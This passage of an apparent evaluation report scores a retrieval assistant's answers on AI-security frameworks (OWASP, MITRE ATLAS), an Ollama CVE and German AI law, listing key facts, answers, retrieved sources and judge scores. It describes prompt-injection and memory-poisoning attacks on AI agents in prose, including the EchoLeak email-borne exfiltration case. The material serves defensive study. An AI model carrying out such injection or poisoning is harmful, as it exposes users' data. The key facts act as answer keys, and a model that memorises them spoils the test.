> 3. Memory Poisoning for System: The attacker retrains a security AI’s memory to label malicious activity as normal, letting attacks slip through undetected.
> 4. Shared Memory Poisoning: The attacker inserts bogus refund policies into shared memory, other agents reuse them, and the business suffers bad decisions, losses, and disputes.
> 5. Cross-tenant vector bleed: Near-duplicate content seeded by an attacker exploits loose namespace filters, pulling another tenant’s sensitive chunk into retrieval by high cosine similarity
> 6. Assistant Memory Poisoning: An attacker implants a user assistants’ memory via Indirect Prompt Injection, compromising that user’s current and future sessions.

**ASI03**

> Identity & Privilege Abuse exploits dynamic trust and delegation in agents to escalate access and bypass controls by manipulating delegation chains, role inheritance, control flows, and agent context; context includes cached credentials or conversation history across interconnected systems. In this context, identity refers both to the agent’s defined persona and to any authentication material that represents it. Agent-to- agent trust or inherited credentials can be exploited to escalate access, hijack privileges, or execute unauthorized actions. This risk arises from the architectural mismatch between user-centric identity systems and agentic design. Without a distinct, governed identity of its own, an agent operates in an attribution gap that makes enforcing true least privilege impossible. Identity in this context includes both the agent’s assigned persona and any authentication material (API keys, OAuth tokens, delegated user sessions) that represent it. This differs scenario in ASI02 (Tools Misuse) which is an unintended or unsafe use of already granted privilege by a principal misusing its own tools. Identity & Privilege Abuse is the agentic evolution of Excessive Agency (LLM06:2025). It often leverages Prompt Injection (LLM01:2025), and because of agent permissions, tool integrations, and multi-agent systems, the impact can amplify and exceed Sensitive Information Disclosure (LLM02:2025) to directly compromise the confidentiality, integrity, and availability of systems and data the agent can reach. In the OWASP ASI Threats and Mitigations, it maps one-to-one to T3: Privilege Compromise, and in OWASP AIVSS it corresponds to Core Risk 2: Agent Access Control Violation.

**ASI06**

> 1. Baseline data protection: Encryption in transit and at rest combined with least-privilege access
> 2. Content validation: Scan all new memory writes and model outputs (rules + AI) for malicious or sensitive content before commit.
> 3. Memory segmentation: Isolate user sessions and domain contexts to prevent knowledge and sensitive data leakage.
> 4. Access and retention: Allow only authenticated, curated sources; enforce context-aware access per task; minimize retention by data sensitivity.
> 5. Provenance and anomalies: Require source attribution and detect suspicious updates or frequencies.
>
> 6. Prevent automatic re-ingestion of an agent’s own generated outputs into trusted memory to avoid self-reinforcing contamination or “bootstrap poisoning.”
> 7. Resilience and verification: Perform adversarial test, use snapshots/rollback and version control, and require human review for high-risk actions. Where you operate shared vector or memory stores, use per-tenant namespaces and trust scores for entries, decaying or expiring unverified memory over time and supporting rollback/quarantine for suspected poisoning.
> 8. Expire unverified memory to limit poison persistence.
> 9. Weight retrieval by trust and tenancy: Require two factors to surface high-impact memory (e.g., provenance score plus human-verified tag) and decay low-trust entries over time.

</details>

**Score (1-5):** 4

*Claude's assessment:* Key facts 1 and 2 are stated accurately. Key fact 3 is only partly there: transport, routing and semantic layers are named, but discovery, covert/side channels and the consequences are missing. The extra claims all match the PDF.

*Checked against:* <https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/>, `data/raw/owasp-agentic-2026/2026__2025-12-09_/agentic-top10.pdf`

---

## 16. Wie hoch ist der gesetzliche Mindestlohn in Deutschland?

<!-- id: abstain-mindestlohn:baseline -->

**Key facts**

- The question is not answerable from the indexed sources

**Answer**

> I can't answer that from the indexed sources.

**Score (1-5):** 5

*Claude's assessment:* Declines, which the key facts expect.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 17. What are the top 3 risks in the OWASP Top 10 for Agentic Applications?

<!-- id: list-agentic-top3:baseline -->

**Key facts**

- ASI01 Agent Goal Hijack
- ASI02 Tool Misuse and Exploitation
- ASI03 Identity and Privilege Abuse

**Answer**

> I can't answer that from the indexed sources.

**Score (1-5):** 1

*Claude's assessment:* Declines an answerable question; names none of ASI01-ASI03.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 18. What is CVE-2025-63389 in Ollama?

<!-- id: cve-ollama-auth:baseline -->

**Key facts**

- Missing authentication in the Ollama platform lets attackers perform model management operations
- CVSS 9.8 CRITICAL, CWE-306
- No fixed version is listed

**Answer**

> CVE-2025-63389 is a **critical missing-authentication vulnerability** in Ollama’s API. A remote attacker who can reach the API may perform unauthorized model management operations without logging in. NVD lists versions **up to and including v0.12.3** as affected and assigns **CVSS 9.8 (Critical)** [CVE-2025-63389](https://nvd.nist.gov/vuln/detail/CVE-2025-63389) [CWE-306].
>
> Advisory records disagree on the affected version range, so check the CVE record and Ollama’s current guidance before deciding whether a specific release is affected. I couldn’t confirm a patched version from the sources I checked.

**Score (1-5):** 5

*Claude's assessment:* All three key facts (missing auth for model management, CVSS 9.8 / CWE-306, no fixed version), and the extra claims hold.

*Checked against:* <https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-63389>, <https://github.com/advisories/GHSA-f6mr-38g8-39rg>, <https://api.osv.dev/v1/vulns/GO-2025-4251>

---

## 19. List all ten OWASP Top 10 for LLM Applications 2026 risks.

<!-- id: list-llm-all:rag -->

**Key facts**

- LLM01:2026 Prompt Injection
- LLM02:2026 Sensitive Information Disclosure
- LLM03:2026 Excessive Agency
- LLM04:2026 Supply Chain
- LLM05:2026 Data and Model Poisoning
- LLM06:2026 Unbounded Consumption
- LLM07:2026 Misinformation
- LLM08:2026 Hidden Context Exposure
- LLM09:2026 Vector and Embedding Weaknesses
- LLM10:2026 Improper Output Handling

**Answer**

> 1. LLM01:2026 — Prompt Injection [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 2. LLM02:2026 — Sensitive Information Disclosure [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 3. LLM03:2026 — Excessive Agency [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 4. LLM04:2026 — Supply Chain [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 5. LLM05:2026 — Data and Model Poisoning [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 6. LLM06:2026 — Unbounded Consumption [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 7. LLM07:2026 — Misinformation [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 8. LLM08:2026 — Hidden Context Exposure [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 9. LLM09:2026 — Vector and Embedding Weaknesses [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)
> 10. LLM10:2026 — Improper Output Handling [OWASP LLM Top 10 2026](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/9253e38ade58e959b531c0c5c9a4842272c9cd0e/2026/final)

<details><summary>6 sources the judge saw</summary>

**OWASP LLM Top 10 2026**

> The OWASP Top 10 for LLM Applications 2026 lists these risks, by number:
> LLM01:2026 Prompt Injection: A **prompt-injection vulnerability** occurs when input to a large language model (LLM), whether direct user input, retrieved content, tool output, image,…
> LLM02:2026 Sensitive Information Disclosure: Sensitive information disclosure occurs when an LLM-integrated system exposes confidential, regulated, privileged, or proprietary data through a channel the…
> LLM03:2026 Excessive Agency: An LLM-based system is often granted a degree of agency by its developer: the ability to call functions or interface with other systems via tools (also called…
> LLM04:2026 Supply Chain: LLM supply chains are susceptible to vulnerabilities that affect the integrity of training data, models, adapters, conversion pipelines, and deployment…
> LLM05:2026 Data and Model Poisoning: Data and Model Poisoning describes a class of attacks and failures where an adversary (or unsafe process) manipulates data or model artifacts to embed harmful…
> LLM06:2026 Unbounded Consumption: Unbounded Consumption occurs when an LLM application allows excessive and uncontrolled inferences, enabling attackers to disrupt service availability, inflict…
> LLM07:2026 Misinformation: Misinformation occurs when an LLM or LLM-enabled application produces incorrect, incomplete, unsupported, or misleading information that appears credible…
> LLM08:2026 Hidden Context Exposure: Hidden Context Exposure is the unauthorized extraction, inference, or reconstruction of hidden, non-user-facing system instructions or operational context…
> LLM09:2026 Vector and Embedding Weaknesses: Vector and embedding weaknesses present security risks in any LLM application that converts text, images, code, or audio into numerical representations and…
> LLM10:2026 Improper Output Handling: Improper Output Handling refers specifically to insufficient validation, sanitization, and handling of the outputs generated by large language models before…

**LLM04:2026**

> #### 1. Vulnerable or Outdated Third-Party Components and Models
>
> Outdated or deprecated components, including packages, serving frameworks, and models themselves, can be exploited to compromise LLM applications. This is similar to [A06:2021 Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) with increased risks when components are used during model development, fine-tuning, or inference. LLM coding assistants add a new variant: they hallucinate plausible but nonexistent package names at scale (Spracklen et al., 2025), which attackers register in advance ("slopsquatting") so that unverified AI-suggested dependencies resolve to malicious code.
>
> #### 2. Licensing Risks
>
> AI development involves diverse software and dataset licenses that impose different usage, distribution, and commercialization requirements. If not properly managed, they create legal and compliance exposure.
>
> #### 3. Vulnerable or Tampered Pre-Trained Models
>
> Model artifacts are difficult to inspect comprehensively, and static analysis alone cannot establish behavioral safety. A pre-trained model can contain hidden biases or backdoors introduced through poisoned datasets or direct tampering. Migrating away from unsafe serialization formats such as Python pickle, which can execute arbitrary code on load, reduces but does not eliminate this risk: a backdoor can be embedded directly in a model's computational graph and persist in formats widely considered safe, such as ONNX, and a crafted model file can exploit memory-corruption bugs in a format's native parser, as shown by heap overflows in llama.cpp's GGUF parsing (CVE-2024-23496) (Cisco Talos, 2024).
>
> #### 4. Weak Provenance and Unsigned Model Artifacts
>
> Published models carry no strong provenance assurances: Model Cards document a model but do not prove its origin, and a compromised or lookalike supplier account can publish a malicious model under a trusted name. When models, adapters, datasets, fine-tuned checkpoints, and conversion outputs are not signed or hash-pinned, an attacker can replace or silently alter artifacts in transit, in storage, or at the promotion boundary where automated pipelines accept artifacts into trusted environments, especially when pipelines resolve artifacts by a mutable reference (for example, a `latest` tag) instead of an immutable digest.
>
> #### 5. Vulnerable Adapters and Compromised Conversion, Merge, and Quantization Workflows

**OWASP Agentic Top 10 2026**

> The OWASP Top 10 for Agentic Applications 2026 lists these risks, by number:
> ASI01 Agent Goal Hijack: AI Agents exhibit autonomous ability to execute a series of tasks to achieve a goal.
> ASI02 Tool Misuse and Exploitation: Agents can misuse legitimate tools due to prompt injection, misalignment, or unsafe delegation or ambiguous instruction - leading to data exfiltration, tool…
> ASI03 Identity and Privilege Abuse: Identity & Privilege Abuse exploits dynamic trust and delegation in agents to escalate access and bypass controls by manipulating delegation chains, role…
> ASI04 Agentic Supply Chain Vulnerabilities: Agentic Supply Chain Vulnerabilities arise when agents, tools, and related artefacts they work with are provided by third parties and may be malicious,…
> ASI05 Unexpected Code Execution (RCE): Agentic systems - including popular vibe coding tools - often generate and execute code.
> ASI06 Memory & Context Poisoning: Agentic systems rely on stored and retrievable information which can be a snapshot of its conversation history, a memory tool or expanded context, which…
> ASI07 Insecure Inter-Agent Communication: Multi agent systems depend on continuous communication between autonomous agents that coordinate via APIs, message buses, and shared memory, significantly…
> ASI08 Cascading Failures: Agentic cascading failures occur when a single fault (hallucination, malicious input, corrupted tool, or poisoned memory) propagates across autonomous agents,…
> ASI09 Human-Agent Trust Exploitation: Intelligent agents can establish strong trust with human users through their natural language fluency, emotional intelligence, and perceived expertise, known…
> ASI10 Rogue Agents: Rogue Agents are malicious or compromised AI Agents that deviate from their intended function or authorized scope, acting harmfully, deceptively, or…

**LLM06:2026**

> #### 1. Variable-Length Input Flood and Output Explosion
>
> Attackers can overload the LLM with numerous inputs of varying lengths, exploiting processing inefficiencies. This can deplete resources and potentially render the system unresponsive, significantly impacting service availability. This also includes output explosion via fine-tuning poisoning, where a single malicious training sample breaks the model's end-of-sequence behavior and pushes output to the maximum length on every request (Gao et al., 2024).
>
> #### 2. Denial of Wallet (DoW)
>
> By initiating a high volume of operations, attackers exploit the cost-per-use model of cloud-based AI services, leading to unsustainable financial burdens on the provider and risking financial ruin.
>
> #### 3. Large-Context Abuse
>
> Repeated near-limit requests, context accumulation, and application-side rechunking consume disproportionate compute and memory. Many APIs reject inputs that exceed the context window outright, so the durable risk comes from requests that stay just within limits while inflating per-request cost.
>
> #### 4. Reasoning-Loop and Thinking-Token Exhaustion
>
> Attackers craft short, benign-looking prompts that result in resource exhaustion by forcing extended-thinking models into prolonged or non-terminating reasoning loops, consuming massive thinking-token budgets while bypassing input-size filters (Li et al., 2025). Because these prompts are small and appear legitimate, standard input validation provides no protection.
>
> #### 5. Adversarial Inputs Optimized for Resource Overconsumption
>
> Attackers use optimization techniques to craft inputs that maximize computational cost. This is distinct from simply asking the model to perform a resource-intensive task and includes sponge examples (Shumailov et al., 2020) and adversarial visual perturbations. It covers optimization of adversarial input with gradient-based and gradient-free techniques. Unlike reasoning-loop attacks, these require explicit optimization over the input space rather than prompt design alone.
>
> #### 6. Multimodal Inputs and Outputs
>
> Multimodal models convert images, audio, and video into large numbers of tokens, so a single request can cost substantially more than a comparable text-only request. The exact overhead varies with the model, provider, resolution, media duration, and preprocessing pipeline.
>
> #### 7. Model Extraction and Distillation Theft

**LLM04:2026**

> 1. Carefully vet data sources and suppliers, including T&Cs and privacy policies, and only use trusted suppliers. Regularly review and audit supplier security and access, and re-assess on changes in their security posture or T&Cs.
> 2. Apply the mitigations in the OWASP Top Ten's [A06:2021 Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/): vulnerability scanning, management, and a patching policy that keeps the application on maintained versions of components, APIs, and underlying models. Apply the same controls to development environments with access to sensitive data, and verify that AI-suggested dependencies exist and are the intended package before adopting them.
> 3. Apply AI red teaming and evaluations when selecting third-party models, focused on the use cases in scope, and continue in production with anomaly detection and adversarial robustness testing in MLOps and LLM pipelines to detect tampering and poisoning.
> 4. Maintain an up-to-date, signed inventory of components using a Software Bill of Materials (SBOM), extended to models, adapters, and datasets with AI BOMs (AIBOMs) and ML SBOMs, evaluating options such as the OWASP CycloneDX ML-BOM (OWASP CycloneDX, n.d.) and the OWASP AIBOM project (OWASP GenAI Security Project, 2025). Track licenses in the same inventory and audit it regularly for compliance and transparency.
> 5. Only use models from verifiable sources and compensate for weak provenance with third-party integrity checks, signing, and file hashes. Cryptographic model signing backed by a transparency log (for example, the OpenSSF Model Signing project and Sigstore) binds a model artifact to a signer identity (Open Source Security Foundation, 2025). Reproducible builds are not guaranteed for model training, and the Coalition for Secure AI (CoSAI) provides a maturity model for signing ML artifacts (OASIS Open, 2025). Signing proves integrity and origin, not safety (a validly signed model from a compromised or trusted-but-malicious supplier can still be backdoored), so combine it with immutable artifact references, provenance policy, policy-based release gates (for example, SLSA) (Open Source Security Foundation, n.d.), behavioral evaluation, and continuous validation of upstream model integrity. Similarly, use code signing for externally supplied code.

**LLM08:2026**

> * Disclosed rules or logic enable more targeted prompt injection (LLM01:2026).
> * Embedded credentials constitute sensitive information disclosure (LLM02:2026).
> * Revealed tool permissions and schemas expand the surface for excessive agency (LLM03:2026).
> * Leaked output-formatting rules can facilitate improper output handling (LLM10:2026).
>
> In summary, LLM08 covers the foundational risk that hidden LLM control context is exposed, inferred, or reconstructed in a way that materially increases attacker capability. LLM08 does not cover:
>
> * The leakage of regulated user or training data (LLM02 Sensitive Information Disclosure).
> * The agentic amplifications of this risk, e.g., persistent memory, inter-agent channels, tool configuration persistence, and multi-step agent compromise (the OWASP Top 10 for Agentic Applications).
> * Generic application-security concerns inherited by LLM-integrated systems, e.g., server-side log leakage, client-side bundle inspection, and infrastructure-layer side channels.

</details>

**Score (1-5):** 5

*Claude's assessment:* All ten 2026 entries, with correct IDs, names and order.

*Checked against:* <https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/tree/main/2026/final>

---

## 20. Which ATLAS tactic is AML.T0110 AI Agent Tool Poisoning related to?

<!-- id: join-t0110-tactic:baseline -->

**Key facts**

- AML.T0110 achieves the tactic AML.TA0006 Persistence

**Answer**

> AML.T0110 AI Agent Tool Poisoning is associated with the **Persistence** tactic. [AML.T0110]

**Score (1-5):** 5

*Claude's assessment:* Correctly maps AML.T0110 to Persistence, which is its only tactic in the data.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 21. Wie lautet § 9 Abs. 2 KI-MIG zur Zusammenarbeit der zuständigen Behörden im genauen Wortlaut?

<!-- id: german-legal-ki-mig-9-abs-2:rag -->

**Key facts**

- Soweit ihre jeweiligen Zuständigkeiten bei konkreten Marktüberwachungstätigkeiten oder bei Prüfungen und Maßnahmen gemäß Artikel 79 der Verordnung (EU) 2024/1689 betroffen sind, informieren sich die Behörden gegenseitig über Maßnahmen, die sie zu ergreifen beabsichtigen.
- Die Pflicht betrifft die Marktüberwachungsbehörden, die Behörden und öffentlichen Stellen nach Artikel 77 Absatz 1 der Verordnung (EU) 2024/1689 und die sonstigen Behörden.
- Im Rahmen der Durchführung von Maßnahmen teilen sie einander Beobachtungen und Feststellungen mit, die sie für die Erfüllung ihrer jeweiligen Aufgaben nach diesem Gesetz oder der Verordnung (EU) 2024/1689 benötigen.

**Answer**

> „Soweit ihre jeweiligen Zuständigkeiten bei konkreten Marktüberwachungstätigkeiten oder bei Prüfungen und Maßnahmen gemäß Artikel 79 der Verordnung (EU) 2024/1689 betroffen sind, informieren sich die Marktüberwachungsbehörden, die Behörden und öffentlichen Stellen nach Artikel 77 Absatz 1 der Verordnung (EU) 2024/1689 und die sonstigen Behörden gegenseitig über Maßnahmen, die sie zu ergreifen beabsichtigen. Im Rahmen der Durchführung von Maßnahmen teilen sie einander Beobachtungen und Feststellungen mit, die sie für die Erfüllung ihrer jeweiligen Aufgaben nach diesem Gesetz oder der Verordnung (EU) 2024/1689 benötigen.“ [KI-MIG § 9 Abs. 2](https://www.gesetze-im-internet.de/ki-mig/__9.html)

<details><summary>8 sources the judge saw</summary>

**KI-MIG § 9 Abs. 2**

> (2) Soweit ihre jeweiligen Zuständigkeiten bei konkreten Marktüberwachungstätigkeiten oder bei Prüfungen und Maßnahmen gemäß Artikel 79 der Verordnung (EU) 2024/1689 betroffen sind, informieren sich die Marktüberwachungsbehörden, die Behörden und öffentlichen Stellen nach Artikel 77 Absatz 1 der Verordnung (EU) 2024/1689 und die sonstigen Behörden gegenseitig über Maßnahmen, die sie zu ergreifen beabsichtigen. Im Rahmen der Durchführung von Maßnahmen teilen sie einander Beobachtungen und Feststellungen mit, die sie für die Erfüllung ihrer jeweiligen Aufgaben nach diesem Gesetz oder der Verordnung (EU) 2024/1689 benötigen.

**KI-MIG § 9 Abs. 1**

> (1) Die Marktüberwachungsbehörden und die notifizierenden Behörden arbeiten zur Erfüllung ihrer Aufgaben im Rahmen ihrer jeweiligen Zuständigkeiten kooperativ und vertrauensvoll zusammen. Sie teilen einander Beobachtungen und Feststellungen mit, die für die Erfüllung ihrer jeweiligen Aufgaben von Bedeutung sein können.

**KI-MIG § 9 Abs. 4**

> (4) Die Marktüberwachungsbehörden beziehen bei der Wahrnehmung ihrer Aufgaben nach der Verordnung (EU) 2024/1689 insbesondere auch die folgenden sonstigen Behörden ein, soweit deren jeweiliger Zuständigkeitsbereich berührt ist:
> 1. die Datenschutzaufsichtsbehörden des Bundes und der Länder,
> 2. der nach Artikel 52 Absatz 2 der Verordnung (EU) 2024/2847 zu benennenden Marktüberwachungsbehörde und
> 3. das Bundeskartellamt.

**KI-MIG § 9 Abs. 5**

> (5) Die in den Absätzen 1 bis 4 genannten Behörden können im Rahmen ihrer Zuständigkeit unabhängig von der jeweils gewählten Verfahrensart untereinander Informationen einschließlich personenbezogener Daten und Betriebs- und Geschäftsgeheimnisse austauschen, soweit dies zur Erfüllung ihrer jeweiligen Aufgaben gemäß der Verordnung (EU) 2024/1689 und dieses Gesetzes unbedingt erforderlich ist. Sie können diese Informationen in ihren Verfahren verwerten. Beweisverwertungsverbote bleiben unberührt. Die Regelungen über die Rechtshilfe in Strafsachen sowie Amts- und Rechtshilfeabkommen bleiben unberührt.

**KI-MIG § 2 Abs. 9**

> (9) Die nach den Absätzen 1 bis 7 zuständigen Behörden können Sachverständige des wissenschaftlichen Gremiums (Artikel 68 der Verordnung (EU) 2024/1689) gemäß Artikel 69 der Verordnung (EU) 2024/1689 hinzuziehen.

**KI-MIG § 9 Abs. 6**

> (6) Die bei der Bundesanstalt für Finanzdienstleistungsaufsicht beschäftigten und die von ihr beauftragten Personen dürfen solche ihnen bei ihrer Tätigkeit bekanntgewordenen Tatsachen, deren Geheimhaltung im Interesse eines nach der Verordnung (EU) 2024/1689 Verpflichteten, der zuständigen Behörden oder eines Dritten liegt, insbesondere Geschäfts- und Betriebsgeheimnisse, nicht unbefugt offenbaren oder verwerten, auch dann nicht, wenn sie nicht mehr im Dienst sind oder ihre Tätigkeit beendet ist. Ein unbefugtes Offenbaren oder Verwerten liegt insbesondere dann nicht vor, wenn
> 1. Tatsachen an Behörden oder andere öffentliche Stellen weitergegeben werden und die Weitergabe der Informationen zur Erfüllung der Aufgaben dieser Behörden oder Stellen nach diesem Gesetz oder der Verordnung (EU) 2024/1689 erforderlich ist oder
> 2. Tatsachen nach Artikel 74 Absatz 7 der Verordnung (EU) 2024/1689 an die Europäische Zentralbank weitergegeben werden oder wenn sie an die Deutsche Bundesbank weitergegeben werden, soweit dies im Rahmen der bankaufsichtlichen Aufgaben der Deutschen Bundesbank erforderlich ist.

**KI-MIG § 9 Abs. 3**

> (3) Kommen die Marktüberwachungsbehörden zu dem Ergebnis, dass öffentliche Stellen im Sinne des § 2 Absatz 1 und 2 des Bundesdatenschutzgesetzes, gegen die Verordnung (EU) 2024/1689 verstoßen, so ist dies der für die jeweilige öffentliche Stelle zuständigen Rechts- oder Fachaufsichtsbehörde mitzuteilen und dieser vor Durchführung von Maßnahmen gegenüber der öffentlichen Stelle Gelegenheit zur Stellungnahme innerhalb einer angemessenen Frist einzuräumen. Von der Einräumung der Gelegenheit zur Stellungnahme kann abgesehen werden, wenn eine sofortige Entscheidung wegen Gefahr im Verzug oder im öffentlichen Interesse notwendig erscheint oder ihr ein zwingendes öffentliches Interesse entgegensteht. Die Stellungnahme der Rechts- oder Fachaufsichtsbehörde soll auch eine Darstellung der aufsichtsrechtlichen Maßnahmen enthalten, die aufgrund der Mitteilung der Behörde oder öffentlichen Stelle nach Absatz 2 Satz 1 getroffen worden sind. Satz 2 ist nicht anzuwenden, soweit es sich bei den öffentlichen Stellen um Strafverfolgungsbehörden im Sinne des Artikels 3 Nummer 45 der Verordnung (EU) 2024/1689 handelt.

**KI-MIG § 9 Abs. 7**

> (7) Werden die in Absatz 6 genannten Tatsachen an eine inländische Behörde oder Stelle weitergegeben, so dürfen die bei dieser Behörde oder Stelle beschäftigten oder von dieser beauftragten Personen die Tatsachen nicht unbefugt offenbaren oder verwerten, auch dann nicht, wenn sie nicht mehr im Dienst sind oder ihre Tätigkeit beendet ist. An ausländische Stellen dürfen die Tatsachen nur dann weitergegeben werden, wenn die bei dieser Stelle beschäftigten oder von ihr beauftragten Personen der Vertraulichkeit nach Artikel 78 der Verordnung (EU) 2024/1689 oder einer dem Absatz 6 Satz 1 weitgehend entsprechenden Verschwiegenheitspflicht unterliegen. Ausländische Stellen sind darauf hinzuweisen, dass sie die Tatsachen nur zu dem Zweck verwerten dürfen, zu dessen Erfüllung sie übermittelt werden. Datenschutzrechtliche Vorschriften und die Befugnisse zur Offenbarung und Verwertung nach anderen Vorschriften bleiben unberührt.

</details>

**Score (1-5):** 5

*Claude's assessment:* Reproduces both sentences of § 9 Abs. 2 KI-MIG word for word (checked against gesetze-im-internet.de and BGBl. 2026 I Nr. 223).

*Checked against:* <https://www.gesetze-im-internet.de/ki-mig/__9.html>, <https://www.recht.bund.de/bgbl/1/2026/223/regelungstext.pdf>

---

## 22. What is MITRE ATLAS case study AML.CS0059 about?

<!-- id: id-atlas-cs0059:baseline -->

**Key facts**

- EchoLeak: a zero-click prompt injection in Microsoft 365 Copilot
- The injection was delivered in an email that Copilot retrieved into its RAG context
- It could exfiltrate sensitive enterprise data without user interaction
- Discovered by Aim Security researchers

**Answer**

> [AML.CS0059] is the EchoLeak case study: a **zero-click prompt injection targeting Microsoft 365 Copilot**, demonstrated by Aim Security. An attacker sends a crafted email containing hidden instructions. When Copilot later retrieves that email while answering a user’s query, the instructions can cause it to expose sensitive enterprise data—without the user opening the email or clicking a link. It is listed as an exercise in ATLAS. [MITRE ATLAS case study summary](https://www.startupdefense.io/mitre-atlas-case-studies)

**Score (1-5):** 5

*Claude's assessment:* All four key facts (EchoLeak, email retrieved into Copilot's context, zero-click exfiltration, Aim Security); nothing false.

*Checked against:* <https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/v6/ATLAS-2026.09.yaml>

---

## 23. And what will the weather be in Berlin tomorrow?

<!-- id: abstain-follow-up-weather:rag -->

*Follow-up to:* What is AML.T0051?

**Key facts**

- The follow-up is not answerable from the indexed sources; the correct response is to decline

**Answer**

> I can't answer that from the indexed sources.
>
> Try naming what you're asking about: a technique ID such as AML.T0051, an OWASP entry such as LLM01, or an AI Act article such as Article 50.
>
> The knowledge base covers:
>
> - AI package vulnerabilities (NVD, GitHub Advisory Database via OSV, CISA KEV)
> - EU AI Act (Regulation (EU) 2024/1689)
> - KI-MIG (KI-Marktüberwachungs- und Innovationsförderungsgesetz)
> - MITRE ATLAS
> - OWASP Top 10 for Agentic Applications 2026
> - OWASP Top 10 for LLM Applications 2026
>
> *AI-generated answer (EU AI Act Art. 50(1)). Check the cited sources.*

<details><summary>4 sources the judge saw</summary>

**AML.T0051**

> LLM Prompt Injection (technique)
>
> An adversary may craft malicious prompts as inputs to an LLM that cause the LLM to act in unintended ways.
> These "prompt injections" are often designed to cause the model to ignore aspects of its original instructions and follow the adversary's instructions instead.
>
> Prompt Injections can be an initial access vector to the LLM that provides the adversary with a foothold to carry out other steps in their operation.
> They may be designed to bypass defenses in the LLM, or allow the adversary to issue privileged commands.
> The effects of a prompt injection can persist throughout an interactive session with an LLM.
>
> Malicious prompts may be injected directly by the adversary ([Direct](/techniques/AML.T0051.000)) either to leverage the LLM to generate harmful content or to gain a foothold on the system and lead to further effects.
> Prompts may also be injected indirectly when the LLM, as part of its normal operation, ingests the malicious prompt from another data source ([Indirect](/techniques/AML.T0051.001)). This type of injection can be used by the adversary to gain a foothold on the system or to target the user of the LLM.
> Malicious prompts may also be [Triggered](/techniques/AML.T0051.002) by user actions or system events.

**AML.T0051.001**

> Indirect (technique)
>
> An adversary may inject prompts indirectly via a separate data channel that the LLM or AI agent ingests, such as text or multimedia pulled from documents, emails, databases or websites. These instructions originate from adversary-controlled content rather than the legitimate user, and are frequently hidden or obfuscated (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example as invisible text.
>
> Adversaries may use this to hijack an agent or LLM in order to gain a foothold in the target system or to act against an unwitting user of that system, inheriting whatever privileges the AI system holds. Adversaries may also stage the lure that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)), or use the resulting foothold to establish persistence (See [AI Agent Context Poisoning](/techniques/AML.T0080)).
>
> Indirect prompt injections have been observed in the wild, with potential impact ranging from harmless pranks, to search engine optimization manipulation, data exfiltration, and destructive actions.[[google-prompt-injections-web]]

**AML.T0051.000**

> Direct (technique)
>
> An adversary may inject prompts directly as a user of the LLM. This type of injection may be used by the adversary to gain a foothold in the system or to misuse the LLM itself, as for example to generate harmful content.

**AML.T0051.002**

> Triggered (technique)
>
> An adversary may trigger a prompt injection via a user action or event that occurs within the victim's environment. Triggered prompt injections often target AI agents, which can be activated by means the adversary identifies during [Discovery](/tactics/AML.TA0008) (See [Activation Triggers](/techniques/AML.T0084.002)). These malicious prompts may be hidden or obfuscated from the user and may already exist somewhere in the victim's environment from the adversary performing [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093). This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.

</details>

**Score (1-5):** 5

*Claude's assessment:* Correctly declines the out-of-scope weather follow-up.

*Checked against:* `evals/rubrics/judge_v1.md`

---

## 24. What kinds of information might attackers look for on a company's own websites when preparing an attack on its AI systems, and how could they use it?

<!-- id: freshness-aml-t0003:rag -->

**Key facts**

- Victim-owned websites may contain technical details about the organization's AI-enabled products or services, as well as names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info.
- These sites may also reveal details about business operations and relationships.
- Adversaries can use this information to tailor their attacks (e.g. adversarial AI attacks or manual modification) and to find opportunities for other reconnaissance, such as searching open technical databases or open AI vulnerability analysis.

**Answer**

> Attackers may look for technical details about the company’s AI-enabled products or services, as well as department names, locations, employees’ names and roles, contact information, business operations, and organizational relationships. [AML.T0003](https://atlas.mitre.org/techniques/AML.T0003)
>
> They can use those details to tailor attacks and identify further reconnaissance opportunities. Publicly indexed company domains may also reveal software platforms or AI interfaces that attackers can investigate for later attacks. [AML.T0003](https://atlas.mitre.org/techniques/AML.T0003) [AML.T0095](https://atlas.mitre.org/techniques/AML.T0095)

<details><summary>2 sources the judge saw</summary>

**AML.T0003**

> Search Victim-Owned Websites (technique)
>
> Adversaries may search websites owned by the victim for information that can be used during targeting.
> Victim-owned websites may contain technical details about their AI-enabled products or services.
